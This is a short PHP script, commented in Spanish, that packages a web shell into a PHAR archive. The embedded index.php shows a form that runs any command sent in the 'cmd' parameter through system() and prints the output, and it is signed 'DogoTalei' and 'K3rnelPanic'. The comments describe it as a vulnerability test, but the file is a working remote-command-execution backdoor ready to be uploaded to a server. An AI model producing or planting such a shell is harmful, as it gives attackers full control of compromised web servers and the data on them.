<?php
// Archivo PHP que crea un PHAR para pruebas de vulnerabilidad con una firma personalizada
$pharFile = 'phar_vuln_test.phar';

// Crear un nuevo archivo PHAR
$phar = new Phar($pharFile);

// Contenido del archivo PHP con firma personalizada
$phpContent = <<<'EOF'
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if (isset($_GET['cmd'])) {
        // Ejecutar el comando ingresado y mostrar la salida
        echo htmlspecialchars(system($_GET['cmd'] . ' 2>&1'));
    }
?>
</pre>
<p>Signature: DogoTalei</p>
<p>Community: K3rnelPanic</p>
</body>
</html>
EOF;

// Agregar el archivo PHP al PHAR
$phar->addFromString('index.php', $phpContent);

// Configurar el archivo PHAR para que ejecute el archivo principal
$phar->setStub($phar->createDefaultStub('index.php'));

// Mensaje de éxito
echo "PHAR file created successfully: $pharFile\n";
